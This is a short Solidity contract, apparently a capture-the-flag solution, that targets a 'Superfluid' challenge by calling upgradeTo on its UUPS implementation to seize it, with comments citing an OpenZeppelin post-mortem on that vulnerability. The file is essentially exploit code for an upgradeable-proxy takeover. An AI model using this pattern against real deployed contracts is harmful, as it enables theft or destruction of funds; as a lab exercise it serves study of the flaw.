// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

import './Setup.sol';
import 'hardhat/console.sol';

contract Exploit {
    Superfluid challenge;
    constructor (Setup _challenge) {

        challenge = Superfluid(payable(_challenge.impl()));
    }

    // this should be it:
    // https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680
    // this was a hard one.
    // a) there are some traps in the ctf which can distract you ("oh, signatures - are they malleable? :eyes:")
    // b) I didn't play around with the UUPS vulnerability yet
    // c) I don't like proxies in general, the details can be confusing
    function exploit() external {
        // ERC1967Proxy proxy = ERC1967Proxy(challenge);
        UUPSUpgradeable proxy = UUPSUpgradeable(challenge);
        proxy.upgradeTo(address(this));
    }

    fallback() external {
        console.log("CALLED");
    }
}